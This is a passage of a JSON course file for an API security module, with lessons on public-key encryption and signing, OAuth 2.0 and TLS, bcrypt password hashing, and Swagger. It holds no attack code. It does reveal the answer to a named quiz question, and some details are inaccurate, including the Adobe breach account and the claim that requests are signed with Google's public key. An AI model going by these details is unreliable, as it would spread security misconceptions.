a private message from Amir over the internet. They have never met. Amir needs a way to lock the message so only Tom can open it — but how does he get Tom&#39;s lock without already having a secure channel to share it? This is the key exchange problem, and it is why asymmetric encryption exists.","text":"Tom wants to receive a private message from Amir over the internet. They have never met. Amir needs a way to lock the message so only Tom can open it — but how does he get Tom's lock without already having a secure channel to share it? This is the key exchange problem, and it is why asymmetric encryption exists."},{"kind":"h2","html":"The key exchange problem","text":"The key exchange problem"},{"kind":"p","html":"Imagine you want to mail a locked box to a friend. You lock the box, but now you need to send her the key so she can open it. You mail the key separately — but anyone who intercepts it can make a copy. The box is useless.","text":"Imagine you want to mail a locked box to a friend. You lock the box, but now you need to send her the key so she can open it. You mail the key separately — but anyone who intercepts it can make a copy. The box is useless."},{"kind":"p","html":"This is the key exchange problem. Two parties want to communicate privately, but to encrypt and decrypt messages they first need to share a secret key. Sending that key over an unsecured network defeats the purpose. If the channel is already insecure, you cannot safely transmit the very key that would make it secure.","text":"This is the key exchange problem. Two parties want to communicate privately, but to encrypt and decrypt messages they first need to share a secret key. Sending that key over an unsecured network defeats the purpose. If the channel is already insecure, you cannot safely transmit the very key that would make it secure."},{"kind":"p","html":"Symmetric encryption uses the same secret key to lock and to unlock. Both parties must have that key before any secure exchange can happen. Getting the key to the other party securely — without already having a secure channel — is a circular problem.","text":"Symmetric encryption uses the same secret key to lock and to unlock. Both parties must have that key before any secure exchange can happen. Getting the key to the other party securely — without already having a secure channel — is a circular problem."},{"kind":"p","html":"This is exactly the problem that motivated asymmetric encryption, RSA, and the Diffie-Hellman protocol.","text":"This is exactly the problem that motivated asymmetric encryption, RSA, and the Diffie-Hellman protocol."},{"kind":"h2","html":"Symmetric vs asymmetric encryption","text":"Symmetric vs asymmetric encryption"},{"kind":"p","html":"\u003cstrong\u003eSymmetric encryption\u003c/strong\u003e uses one secret key shared by both parties. It is fast and simple once the key is established. The hard part is establishing the key safely.","text":"**Symmetric encryption** uses one secret key shared by both parties. It is fast and simple once the key is established. The hard part is establishing the key safely."},{"kind":"p","html":"\u003cstrong\u003eAsymmetric encryption\u003c/strong\u003e uses two mathematically linked keys — a public key and a private key — that belong to one person.","text":"**Asymmetric encryption** uses two mathematically linked keys — a public key and a private key — that belong to one person."},{"kind":"p","html":"\u003cul\u003e\n\u003cli\u003eTom generates a key pair: \u003ccode\u003etom_public_key\u003c/code\u003e and \u003ccode\u003etom_private_key\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eTom shares his public key with everyone. He keeps his private key secret.\u003c/li\u003e\n\u003cli\u003eWhat Tom locks with his private key, only Tom&#39;s public key can open.\u003c/li\u003e\n\u003cli\u003eWhat others lock with Tom&#39;s public key, only Tom&#39;s private key can open.\u003c/li\u003e\n\u003c/ul\u003e","text":"- Tom generates a key pair: `tom_public_key` and `tom_private_key`.\n- Tom shares his public key with everyone. He keeps his private key secret.\n- What Tom locks with his private key, only Tom's public key can open.\n- What others lock with Tom's public key, only Tom's private key can open."},{"kind":"p","html":"This eliminates the key exchange problem. Anyone can encrypt a message to Tom using his public key — a key he shares openly. Only Tom can decrypt it, because only Tom holds the private key.","text":"This eliminates the key exchange problem. Anyone can encrypt a message to Tom using his public key — a key he shares openly. Only Tom can decrypt it, because only Tom holds the private key."},{"kind":"h2","html":"Signing is not the same as encrypting","text":"Signing is not the same as encrypting"},{"kind":"p","html":"Signing and encrypting are different operations with opposite key directions.","text":"Signing and encrypting are different operations with opposite key directions."},{"kind":"table","html":"\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003eOperation\u003c/th\u003e\n\u003cth\u003eSender uses\u003c/th\u003e\n\u003cth\u003eReceiver uses\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\u003ctr\u003e\n\u003ctd\u003eEncryption (confidentiality)\u003c/td\u003e\n\u003ctd\u003eReceiver&#39;s public key\u003c/td\u003e\n\u003ctd\u003eReceiver&#39;s private key (to decrypt)\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eSigning (authenticity)\u003c/td\u003e\n\u003ctd\u003eSender&#39;s private key\u003c/td\u003e\n\u003ctd\u003eSender&#39;s public key (to verify)\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\u003c/table\u003e"},{"kind":"p","html":"\u003cstrong\u003eEncryption\u003c/strong\u003e ensures only the intended receiver can read the message. You lock it with the receiver&#39;s public key. Only the receiver&#39;s private key opens it.","text":"**Encryption** ensures only the intended receiver can read the message. You lock it with the receiver's public key. Only the receiver's private key opens it."},{"kind":"p","html":"\u003cstrong\u003eSigning\u003c/strong\u003e proves the message came from the sender and was not tampered with. The sender locks (signs) the message with their own private key. Anyone with the sender&#39;s public key can verify the signature — but only the true sender could have produced it, because only they hold the private key.","text":"**Signing** proves the message came from the sender and was not tampered with. The sender locks (signs) the message with their own private key. Anyone with the sender's public key can verify the signature — but only the true sender could have produced it, because only they hold the private key."},{"kind":"h2","html":"The Amir→Tom double-envelope scenario","text":"The Amir→Tom double-envelope scenario"},{"kind":"p","html":"Amir wants to send a message to Tom with two guarantees: only Tom can read it, and Tom can verify it came from Amir. Both have each other&#39;s public keys.","text":"Amir wants to send a message to Tom with two guarantees: only Tom can read it, and Tom can verify it came from Amir. Both have each other's public keys."},{"kind":"p","html":"\u003cstrong\u003eStep 1 — Confidentiality (inner envelope).\u003c/strong\u003e\nAmir encrypts the message with Tom&#39;s public key. Only Tom&#39;s private key can decrypt this inner envelope.","text":"**Step 1 — Confidentiality (inner envelope).**\nAmir encrypts the message with Tom's public key. Only Tom's private key can decrypt this inner envelope."},{"kind":"p","html":"\u003cstrong\u003eStep 2 — Authenticity (outer envelope).\u003c/strong\u003e\nAmir signs the entire inner envelope with his own private key. The result is an outer envelope that only Amir could have produced.","text":"**Step 2 — Authenticity (outer envelope).**\nAmir signs the entire inner envelope with his own private key. The result is an outer envelope that only Amir could have produced."},{"kind":"p","html":"\u003cstrong\u003eStep 3 — Tom verifies the sender.\u003c/strong\u003e\nTom opens the outer envelope using Amir&#39;s public key. If it opens, the signature is valid — the message came from Amir and was not altered in transit. Signing ≠ encrypting: this step uses Amir&#39;s public key, not Tom&#39;s keys.","text":"**Step 3 — Tom verifies the sender.**\nTom opens the outer envelope using Amir's public key. If it opens, the signature is valid — the message came from Amir and was not altered in transit. Signing ≠ encrypting: this step uses Amir's public key, not Tom's keys."},{"kind":"p","html":"\u003cstrong\u003eStep 4 — Tom decrypts the content.\u003c/strong\u003e\nTom opens the inner envelope using his own private key. The message is readable only to Tom.","text":"**Step 4 — Tom decrypts the content.**\nTom opens the inner envelope using his own private key. The message is readable only to Tom."},{"kind":"mermaid","source":"sequenceDiagram\n    participant A as Amir\n    participant Net as Network\n    participant T as Tom\n\n    A-\u003e\u003eA: 1. inner = encrypt(message, tom_public_key)\n    A-\u003e\u003eA: 2. outer = sign(inner, amir_private_key)\n    A-\u003e\u003eNet: send(outer)\n    Net-\u003e\u003eT: outer arrives\n    T-\u003e\u003eT: 3. inner = verify(outer, amir_public_key)\n    Note right of T: Confirms sender is Amir\n    T-\u003e\u003eT: 4. message = decrypt(inner, tom_private_key)\n    Note right of T: Confirms only Tom can read it"},{"kind":"h2","html":"Retrieval checkpoint","text":"Retrieval checkpoint"},{"kind":"checkpoint","q":"Amir signed the outer envelope with his private key. Which key does Tom use to verify that the message came from Amir?","a":"Tom uses **Amir's public key**. Signing uses the sender's private key; verification uses the sender's public key. Tom's own keys are not involved in the verification step — they are only used to decrypt the inner (confidential) envelope."},{"kind":"checkpoint","q":"Amir encrypted the inner envelope with Tom's public key. Which key opens the inner envelope?","a":"**Tom's private key**. Encryption for confidentiality uses the receiver's public key; decryption uses the receiver's private key."},{"kind":"h2","html":"Secret key vs private key","text":"Secret key vs private key"},{"kind":"p","html":"A \u003cstrong\u003esecret key\u003c/strong\u003e is the shared key used in symmetric encryption. Both parties hold the same key. Keeping it secret from outsiders is the only protection.","text":"A **secret key** is the shared key used in symmetric encryption. Both parties hold the same key. Keeping it secret from outsiders is the only protection."},{"kind":"p","html":"A \u003cstrong\u003eprivate key\u003c/strong\u003e is one half of an asymmetric key pair. Only its owner holds it. The paired public key is shared openly. Do not use these terms interchangeably — they describe different systems with different security models.","text":"A **private key** is one half of an asymmetric key pair. Only its owner holds it. The paired public key is shared openly. Do not use these terms interchangeably — they describe different systems with different security models."},{"kind":"callout","variant":"pitfall","html":"\u003cp\u003eVerification uses the SENDER&#39;s public key — not the receiver&#39;s keys. ISAQuiz11 Q9 asks which key Tom uses to verify Amir&#39;s message. All four key combinations appear as answer choices. Only &quot;Amir&#39;s public key&quot; is correct. The trap is conflating &quot;verify&quot; (sender&#39;s public key) with &quot;decrypt&quot; (receiver&#39;s private key). Signing and encryption are separate operations. Signing: sender uses their private key → receiver verifies with sender&#39;s public key. Encryption: sender uses receiver&#39;s public key → receiver decrypts with their own private key. The directions are opposite. Getting them reversed is the single most common wrong answer on this topic.\u003c/p\u003e","text":"Verification uses the SENDER's public key — not the receiver's keys. ISAQuiz11 Q9 asks which key Tom uses to verify Amir's message. All four key combinations appear as answer choices. Only \"Amir's public key\" is correct. The trap is conflating \"verify\" (sender's public key) with \"decrypt\" (receiver's private key). Signing and encryption are separate operations. Signing: sender uses their private key → receiver verifies with sender's public key. Encryption: sender uses receiver's public key → receiver decrypts with their own private key. The directions are opposite. Getting them reversed is the single most common wrong answer on this topic."},{"kind":"p","html":"\u003cstrong\u003eTakeaway:\u003c/strong\u003e Symmetric encryption is fast but requires a shared secret key — the key exchange problem makes it unsafe over an open network. Asymmetric encryption solves this by separating public and private keys: anyone can encrypt to you with your public key, but only you can decrypt. Signing proves authorship using the sender&#39;s private key; anyone with the sender&#39;s public key verifies the signature. These two operations — signing and encryption — use opposite key directions. Never confuse them.","text":"**Takeaway:** Symmetric encryption is fast but requires a shared secret key — the key exchange problem makes it unsafe over an open network. Asymmetric encryption solves this by separating public and private keys: anyone can encrypt to you with your public key, but only you can decrypt. Signing proves authorship using the sender's private key; anyone with the sender's public key verifies the signature. These two operations — signing and encryption — use opposite key directions. Never confuse them."}]},{"n":5,"id":"oauth-ssl","title":"OAuth 2.0, bearer tokens, and SSL/TLS","hook":"You can let users sign in with their Google account without ever seeing their Google password — OAuth 2.0 is how.","tags":["OAuth","bearer-token","SSL","TLS","HTTPS","client-id","client-secret"],"module":"API Security","source":"Slide 11","blocks":[{"kind":"p","html":"Your app needs a user&#39;s Google contacts. Asking for their Google password is a security disaster — it gives your app full account access forever. OAuth 2.0 solves this by delegating authentication to Google and issuing a scoped, time-limited bearer token instead.","text":"Your app needs a user's Google contacts. Asking for their Google password is a security disaster — it gives your app full account access forever. OAuth 2.0 solves this by delegating authentication to Google and issuing a scoped, time-limited bearer token instead."},{"kind":"h2","html":"The problem OAuth 2.0 solves","text":"The problem OAuth 2.0 solves"},{"kind":"p","html":"Your ClientApp wants to read a user&#39;s Google profile or calendar. The user does not want to hand you their Google password. OAuth 2.0 lets Google authenticate the user and then hand your app a limited-use token — no password ever touches your server.","text":"Your ClientApp wants to read a user's Google profile or calendar. The user does not want to hand you their Google password. OAuth 2.0 lets Google authenticate the user and then hand your app a limited-use token — no password ever touches your server."},{"kind":"h2","html":"SSL/TLS: the encrypted channel underneath","text":"SSL/TLS: the encrypted channel underneath"},{"kind":"p","html":"Before OAuth 2.0 or any sensitive data flows, the connection itself must be encrypted. SSL/TLS (Transport Layer Security — TLS is the current protocol; SSL is deprecated) provides that encryption layer. When a browser opens an \u003ccode\u003ehttps://\u003c/code\u003e URL, it performs a TLS handshake with the server.","text":"Before OAuth 2.0 or any sensitive data flows, the connection itself must be encrypted. SSL/TLS (Transport Layer Security — TLS is the current protocol; SSL is deprecated) provides that encryption layer. When a browser opens an `https://` URL, it performs a TLS handshake with the server."},{"kind":"p","html":"The handshake does two things:","text":"The handshake does two things:"},{"kind":"p","html":"\u003col\u003e\n\u003cli\u003e\u003cstrong\u003eAuthentication\u003c/strong\u003e — the server sends its SSL/TLS certificate, which contains the server&#39;s public key. The browser verifies this certificate against a trusted Certificate Authority.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eKey exchange\u003c/strong\u003e — browser and server negotiate a shared session key using the public key. All subsequent data is encrypted and decrypted automatically.\u003c/li\u003e\n\u003c/ol\u003e","text":"1. **Authentication** — the server sends its SSL/TLS certificate, which contains the server's public key. The browser verifies this certificate against a trusted Certificate Authority.\n2. **Key exchange** — browser and server negotiate a shared session key using the public key. All subsequent data is encrypted and decrypted automatically."},{"kind":"p","html":"Your application code does not implement this encryption. The TLS layer handles it transparently. HTTPS = HTTP running over TLS.","text":"Your application code does not implement this encryption. The TLS layer handles it transparently. HTTPS = HTTP running over TLS."},{"kind":"checkpoint","q":"Why does the TLS handshake send the server's public key inside the certificate?","a":"The browser uses the public key to securely exchange a session key. Only the server (holding the matching private key) can decrypt it, proving the server's identity and establishing the encrypted channel."},{"kind":"h2","html":"OAuth 2.0: the four-step flow","text":"OAuth 2.0: the four-step flow"},{"kind":"h3","html":"Step 0 — Onboarding (one-time setup by the app owner)","text":"Step 0 — Onboarding (one-time setup by the app owner)"},{"kind":"p","html":"Before any user can log in, the app owner registers ClientApp at the Google Developer Console. The owner fills in a form specifying which user data the app needs (profile, contacts, calendar). Google approves the registration and issues two credentials:","text":"Before any user can log in, the app owner registers ClientApp at the Google Developer Console. The owner fills in a form specifying which user data the app needs (profile, contacts, calendar). Google approves the registration and issues two credentials:"},{"kind":"p","html":"\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eClient ID\u003c/strong\u003e — a public identifier for ClientApp, sent in redirect URLs.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eClient secret\u003c/strong\u003e — a private credential kept server-side only; never sent to the browser.\u003c/li\u003e\n\u003c/ul\u003e","text":"- **Client ID** — a public identifier for ClientApp, sent in redirect URLs.\n- **Client secret** — a private credential kept server-side only; never sent to the browser."},{"kind":"p","html":"Google also provides the code snippet to render the &quot;Login with Google&quot; button.","text":"Google also provides the code snippet to render the \"Login with Google\" button."},{"kind":"h3","html":"Step 1 — User clicks &quot;Login with Google&quot;","text":"Step 1 — User clicks \"Login with Google\""},{"kind":"p","html":"The user clicks the button in ClientApp. ClientApp redirects the user&#39;s browser to the Google OAuth 2.0 endpoint, including the client ID in the URL:","text":"The user clicks the button in ClientApp. ClientApp redirects the user's browser to the Google OAuth 2.0 endpoint, including the client ID in the URL:"},{"kind":"code","lang":"text","code":"https://accounts.google.com/o/oauth2/auth?client_id=CLIENT_ID&redirect_uri=...&scope=profile email"},{"kind":"h3","html":"Step 2 — Google authenticates the user and shows the consent screen","text":"Step 2 — Google authenticates the user and shows the consent screen"},{"kind":"p","html":"Google receives the request, looks up the client ID, and displays a consent screen listing exactly what data ClientApp has requested. The user sees: &quot;ClientApp wants to access your name and email.&quot;","text":"Google receives the request, looks up the client ID, and displays a consent screen listing exactly what data ClientApp has requested. The user sees: \"ClientApp wants to access your name and email.\""},{"kind":"h3","html":"Step 3 — User approves; Google issues a bearer token","text":"Step 3 — User approves; Google issues a bearer token"},{"kind":"p","html":"Upon the user clicking &quot;Allow,&quot; Google generates a bearer token for this specific user-app pair. Google redirects the browser back to ClientApp&#39;s registered redirect URI, carrying the bearer token.","text":"Upon the user clicking \"Allow,\" Google generates a bearer token for this specific user-app pair. Google redirects the browser back to ClientApp's registered redirect URI, carrying the bearer token."},{"kind":"h3","html":"Step 4 — ClientApp uses the bearer token","text":"Step 4 — ClientApp uses the bearer token"},{"kind":"p","html":"ClientApp now holds the bearer token. It sends this token in the \u003ccode\u003eAuthorization\u003c/code\u003e header with every future request to Google APIs:","text":"ClientApp now holds the bearer token. It sends this token in the `Authorization` header with every future request to Google APIs:"},{"kind":"code","lang":"text","code":"Authorization: Bearer \u003ctoken\u003e"},{"kind":"p","html":"Google sees the token, identifies the user, and returns the requested data.","text":"Google sees the token, identifies the user, and returns the requested data."},{"kind":"h2","html":"Bearer tokens: possession equals authorization","text":"Bearer tokens: possession equals authorization"},{"kind":"p","html":"Anyone who holds this token is implicitly granted authorization. The bearer token does not require the holder to prove identity beyond possession — holding it is enough. This has two consequences:","text":"Anyone who holds this token is implicitly granted authorization. The bearer token does not require the holder to prove identity beyond possession — holding it is enough. This has two consequences:"},{"kind":"p","html":"\u003cul\u003e\n\u003cli\u003eBearer tokens are \u003cstrong\u003etime-limited\u003c/strong\u003e (for example, 6 months). After expiry, the user must re-authorize.\u003c/li\u003e\n\u003cli\u003eClientApp must protect the token. Exposing it (for example, logging it or storing it in a browser-accessible location) gives any attacker the same access as the legitimate app.\u003c/li\u003e\n\u003c/ul\u003e","text":"- Bearer tokens are **time-limited** (for example, 6 months). After expiry, the user must re-authorize.\n- ClientApp must protect the token. Exposing it (for example, logging it or storing it in a browser-accessible location) gives any attacker the same access as the legitimate app."},{"kind":"p","html":"ClientApp signs outgoing requests using its private key and Google&#39;s public key to prevent token interception in transit.","text":"ClientApp signs outgoing requests using its private key and Google's public key to prevent token interception in transit."},{"kind":"h2","html":"OAuth 2.0 as delegation","text":"OAuth 2.0 as delegation"},{"kind":"p","html":"OAuth 2.0 delegates the responsibility of authenticating users to Google. ClientApp does not store, verify, or manage Google passwords. It gains scoped access to user data (name, email, contacts — whatever the user approved) without handling credentials directly.","text":"OAuth 2.0 delegates the responsibility of authenticating users to Google. ClientApp does not store, verify, or manage Google passwords. It gains scoped access to user data (name, email, contacts — whatever the user approved) without handling credentials directly."},{"kind":"mermaid","source":"sequenceDiagram\n    participant U as User/Browser\n    participant C as ClientApp\n    participant G as Google OAuth 2.0\n\n    U-\u003e\u003eC: Click \"Login with Google\"\n    C-\u003e\u003eG: Redirect with client_id + scope\n    G-\u003e\u003eU: Show consent screen\n    U-\u003e\u003eG: User clicks Allow\n    G-\u003e\u003eC: Redirect with bearer token\n    C-\u003e\u003eG: Future requests + bearer token\n    G-\u003e\u003eC: User data (name, email, etc.)"},{"kind":"checkpoint","q":"What happens if an attacker intercepts the bearer token?","a":"The attacker gains full authorization for the scope the token covers — anyone who holds this token is implicitly granted authorization. ClientApp must secure the token and rely on its time limit and HTTPS transport to limit exposure."},{"kind":"callout","variant":"pitfall","html":"\u003cp\u003eThe client secret and bearer token are different things. The client secret identifies the app (stored server-side permanently). The bearer token authorizes one user&#39;s session (time-limited, issued each login). Exposing either to the browser — for example, storing the client secret in frontend JavaScript — breaks the security model entirely.\u003c/p\u003e","text":"The client secret and bearer token are different things. The client secret identifies the app (stored server-side permanently). The bearer token authorizes one user's session (time-limited, issued each login). Exposing either to the browser — for example, storing the client secret in frontend JavaScript — breaks the security model entirely."},{"kind":"p","html":"\u003cstrong\u003eTakeaway:\u003c/strong\u003e SSL/TLS encrypts the channel automatically so OAuth 2.0 tokens travel safely. OAuth 2.0 lets ClientApp access user data by delegating authentication to Google — the user approves a consent screen and Google issues a time-limited bearer token. The client ID is public; the client secret and bearer token must stay private.","text":"**Takeaway:** SSL/TLS encrypts the channel automatically so OAuth 2.0 tokens travel safely. OAuth 2.0 lets ClientApp access user data by delegating authentication to Google — the user approves a consent screen and Google issues a time-limited bearer token. The client ID is public; the client secret and bearer token must stay private."}]},{"n":6,"id":"password-hashing","title":"Password hashing with bcrypt — why hash, not encrypt","hook":"Even you shouldn't be able to recover a stored password — hashing is how you guarantee that.","tags":["bcrypt","hash","salt","password-storage"],"module":"API Security","source":"Slide 9, Slide 11","blocks":[{"kind":"p","html":"In 2013, Adobe lost 153 million user records to a breach. Passwords were encrypted — not hashed. Attackers decrypted them using a stolen key. Every user was compromised in one step. The correct defense was hashing: one-way, irreversible, no key to steal.","text":"In 2013, Adobe lost 153 million user records to a breach. Passwords were encrypted — not hashed. Attackers decrypted them using a stolen key. Every user was compromised in one step. The correct defense was hashing: one-way, irreversible, no key to steal."},{"kind":"h2","html":"The problem: what happens when your database leaks","text":"The problem: what happens when your database leaks"},{"kind":"p","html":"Imagine an attacker exfiltrates your users table. If you stored passwords as plaintext, every user&#39;s password is immediately readable. If you encrypted them, the attacker can also steal your server&#39;s decryption key — and reverse every password in one step. Neither approach protects your users.","text":"Imagine an attacker exfiltrates your users table. If you stored passwords as plaintext, every user's password is immediately readable. If you encrypted them, the attacker can also steal your server's decryption key — and reverse every password in one step. Neither approach protects your users."},{"kind":"p","html":"The fix is hashing. A hash function maps input of any size to a fixed-size output. That mapping is one-way: given the hash, there is no algorithm to recover the original input. Even the server cannot reverse it. A database breach exposes hashes, not passwords.","text":"The fix is hashing. A hash function maps input of any size to a fixed-size output. That mapping is one-way: given the hash, there is no algorithm to recover the original input. Even the server cannot reverse it. A database breach exposes hashes, not passwords."},{"kind":"h2","html":"Hash vs encrypt","text":"Hash vs encrypt"},{"kind":"p","html":"Hashing and encryption are not interchangeable — they solve different problems.","text":"Hashing and encryption are not interchangeable — they solve different problems."},{"kind":"p","html":"\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eEncryption\u003c/strong\u003e is reversible. The server holds a key. Anyone who gains that key can decrypt all stored values. Password storage cannot rely on encryption because the server always holds the risk.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eHashing\u003c/strong\u003e is one-way. No key exists. Given \u003ccode\u003ehash(password)\u003c/code\u003e, the server can verify a submitted password by hashing it and comparing, but cannot recover the original. This is the property password storage requires.\u003c/li\u003e\n\u003c/ul\u003e","text":"- **Encryption** is reversible. The server holds a key. Anyone who gains that key can decrypt all stored values. Password storage cannot rely on encryption because the server always holds the risk.\n- **Hashing** is one-way. No key exists. Given `hash(password)`, the server can verify a submitted password by hashing it and comparing, but cannot recover the original. This is the property password storage requires."},{"kind":"callout","variant":"pitfall","html":"\u003cp\u003eEncrypting passwords instead of hashing is a security misconfiguration. An attacker with server access — through a vulnerability, insider threat, or subpoena — gains the decryption key and can reverse every stored password. Hashing removes that attack surface entirely.\u003c/p\u003e","text":"Encrypting passwords instead of hashing is a security misconfiguration. An attacker with server access — through a vulnerability, insider threat, or subpoena — gains the decryption key and can reverse every stored password. Hashing removes that attack surface entirely."},{"kind":"h2","html":"bcrypt in Node.js","text":"bcrypt in Node.js"},{"kind":"p","html":"Install the library and require it:","text":"Install the library and require it:"},{"kind":"code","lang":"js","code":"const bcrypt = require('bcrypt');"},{"kind":"p","html":"Hash a password on registration:","text":"Hash a password on registration:"},{"kind":"code","lang":"js","code":"const hashedPassword = await bcrypt.hash(plaintext, 10);"},{"kind":"p","html":"\u003ccode\u003ebcrypt.hash()\u003c/code\u003e is asynchronous — it returns a Promise. You must \u003ccode\u003eawait\u003c/code\u003e it. If you omit \u003ccode\u003eawait\u003c/code\u003e, you store a Promise object in the database, not a hash. All subsequent logins will break silently.","text":"`bcrypt.hash()` is asynchronous — it returns a Promise. You must `await` it. If you omit `await`, you store a Promise object in the database, not a hash. All subsequent logins will break silently."},{"kind":"h2","html":"The cost factor","text":"The cost factor"},{"kind":"p","html":"The second argument to \u003ccode\u003ebcrypt.hash()\u003c/code\u003e is the \u003cstrong\u003ecost factor\u003c/strong\u003e (also called salt rounds). The value \u003ccode\u003e10\u003c/code\u003e means bcrypt performs 2^10 = 1,024 internal hashing iterations before producing the final hash.","text":"The second argument to `bcrypt.hash()` is the **cost factor** (also called salt rounds). The value `10` means bcrypt performs 2^10 = 1,024 internal hashing iterations before producing the final hash."},{"kind":"p","html":"A higher cost factor makes each hash slower to compute. Slower hashing is good for password storage: an attacker running millions of brute-force guesses per second pays the full cost for every attempt. Raising the cost factor from 10 to 12 makes brute-force roughly four times harder with no change to your API.","text":"A higher cost factor makes each hash slower to compute. Slower hashing is good for password storage: an attacker running millions of brute-force guesses per second pays the full cost for every attempt. Raising the cost factor from 10 to 12 makes brute-force roughly four times harder with no change to your API."},{"kind":"checkpoint","q":"What does the `10` in `bcrypt.hash('123', 10)` control?","a":"It is the cost factor. It sets the number of hashing iterations to 2^10 = 1,024. A higher value makes each hash computation slower, which makes brute-force attacks more expensive for an attacker."},{"kind":"h2","html":"Verifying a password on login","text":"Verifying a password on login"},{"kind":"p","html":"Never decrypt a stored hash. Instead, hash the submitted plaintext and compare:","text":"Never decrypt a stored hash. Instead, hash the submitted plaintext and compare:"},{"kind":"code","lang":"js","code":"const match = await bcrypt.compare(plaintext, storedHash);"},{"kind":"p","html":"\u003ccode\u003ebcrypt.compare()\u003c/code\u003e returns a boolean: \u003ccode\u003etrue\u003c/code\u003e if the plaintext matches the hash, \u003ccode\u003efalse\u003c/code\u003e otherwise. It never decrypts. It never exposes the original password. This call is also asynchronous — \u003ccode\u003eawait\u003c/code\u003e is required.","text":"`bcrypt.compare()` returns a boolean: `true` if the plaintext matches the hash, `false` otherwise. It never decrypts. It never exposes the original password. This call is also asynchronous — `await` is required."},{"kind":"p","html":"\u003cstrong\u003eTakeaway:\u003c/strong\u003e Hash passwords with bcrypt before storage. Never store plaintext or encrypted passwords. \u003ccode\u003ebcrypt.hash(password, costFactor)\u003c/code\u003e is async — always await it. The cost factor controls brute-force resistance. Verify with \u003ccode\u003ebcrypt.compare()\u003c/code\u003e, which returns a boolean and never decrypts.","text":"**Takeaway:** Hash passwords with bcrypt before storage. Never store plaintext or encrypted passwords. `bcrypt.hash(password, costFactor)` is async — always await it. The cost factor controls brute-force resistance. Verify with `bcrypt.compare()`, which returns a boolean and never decrypts."}]},{"n":7,"id":"api-documentation","title":"API documentation with OpenAPI / Swagger","hook":"A production-ready API tells consumers exactly what it expects — Swagger makes that contract machine-readable.","tags":["swagger","OpenAPI","documentation","JSON"],"module":"API Security","source":"Slide 11","blocks":[{"kind":"p","html":"You finished building a RESTful API. A colleague needs to integrate with it. Without documentation, they must guess endpoint names, parameter names, and response shapes from reading your source code or firing test requests until something works. OpenAPI / Swagger turns that implicit contract into a machine-readable file anyone can open and read.","text":"You finished building a RESTful API. A colleague needs to integrate with it. Without documentation, they must guess endpoint names, parameter names, and response shapes from reading your source code or firing test requests until something works. OpenAPI / Swagger turns that implicit contract into a machine-readable file anyone can open and read."},{"kind":"h2","html":"The problem: guessing games are not a production strategy","text":"The problem: guessing games are not a production strategy"},{"kind":"p","html":"You built a RESTful API that works. Now someone else needs to consume it. Without documentation, they must guess which endpoints exist, what parameters each one accepts, and what the response looks like. That guessing slows them down and breaks integrations when your assumptions differ from theirs.","text":"You built a RESTful API that works. Now someone else needs to consume it. Without documentation, they must guess which endpoints exist, what parameters each one accepts, and what the response looks like. That guessing slows them down and breaks integrations when your assumptions differ from theirs."},{"kind":"p","html":"API documentation solves this by publishing a formal contract: here are the endpoints, here are the expected inputs, here are the possible outputs.","text":"API documentation solves this by publishing a formal contract: here are the endpoints, here are the expected inputs, here are the possible outputs."},{"kind":"h2","html":"What OpenAPI / Swagger is","text":"What OpenAPI / Swagger is"},{"kind":"p","html":"OpenAPI / Swagger is an \u003cstrong\u003eInterface Description Language\u003c/strong\u003e for describing RESTful APIs expressed using JSON (or YAML). It produces a machine-readable specification file — typically named \u003ccode\u003eswagger.json\u003c/code\u003e — that documents the full surface of your API.","text":"OpenAPI / Swagger is an **Interface Description Language** for describing RESTful APIs expressed using JSON (or YAML). It produces a machine-readable specification file — typically named `swagger.json` — that documents the full surface of your API."},{"kind":"p","html":"Tools can read that file to auto-generate interactive documentation, client SDKs, and test harnesses. The specification is not prose; it is structured data that both humans and programs can parse.","text":"Tools can read that file to auto-generate interactive documentation, client SDKs, and test harnesses. The specification is not prose; it is structured data that both humans and programs can parse."},{"kind":"p","html":"A \u003ccode\u003eswagger.json\u003c/code\u003e file documents:","text":"A `swagger.json` file documents:"},{"kind":"p","html":"\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eEndpoints\u003c/strong\u003e — every path (\u003ccode\u003e/patients\u003c/code\u003e, \u003ccode\u003e/users/:id\u003c/code\u003e) and its supported HTTP methods\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequest parameters\u003c/strong\u003e — path params, query params, and headers\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequest body schemas\u003c/strong\u003e — the shape of JSON payloads sent to the API\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eResponse schemas and status codes\u003c/strong\u003e — what the API returns for each outcome\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAuthentication requirements\u003c/strong\u003e — which endpoints require a token or API key\u003c/li\u003e\n\u003c/ul\u003e","text":"- **Endpoints** — every path (`/patients`, `/users/:id`) and its supported HTTP methods\n- **Request parameters** — path params, query params, and headers\n- **Request body schemas** — the shape of JSON payloads sent to the API\n- **Response schemas and status codes** — what the API returns for each outcome\n- **Authentication requirements** — which endpoints require a token or API key"},{"kind":"h2","html":"Workflow: from sample to your own spec","text":"Workflow: from sample to your own spec"},{"kind":"p","html":"\u003cstrong\u003eStep 1 — Get a starter file.\u003c/strong\u003e Go to \u003ca href=\"https://editor.swagger.io/\"\u003eeditor.swagger.io\u003c/a\u003e. Use File &gt; Convert and Save as JSON. You now have a working \u003ccode\u003eswagger.json\u003c/code\u003e you can open and inspect.","text":"**Step 1 — Get a starter file.** Go to [editor.swagger.io](https://editor.swagger.io/). Use File \u003e Convert and Save as JSON. You now have a working `swagger.json` you can open and inspect."},{"kind":"p","html":"\u003cstrong\u003eStep 2 — Install the VS Code extension.\u003c/strong\u003e Install the \u003ca href=\"https://marketplace.visualstudio.com/items?itemName=Arjun.swagger-viewer\"\u003eSwagger Viewer extension\u003c/a\u003e in VS Code.","text":"**Step 2 — Install the VS Code extension.** Install the [Swagger Viewer extension](https://marketplace.visualstudio.com/items?itemName=Arjun.swagger-viewer) in VS Code."},{"kind":"p","html":"\u003cstrong\u003eStep 3 — Open and preview.\u003c/strong\u003e Open your 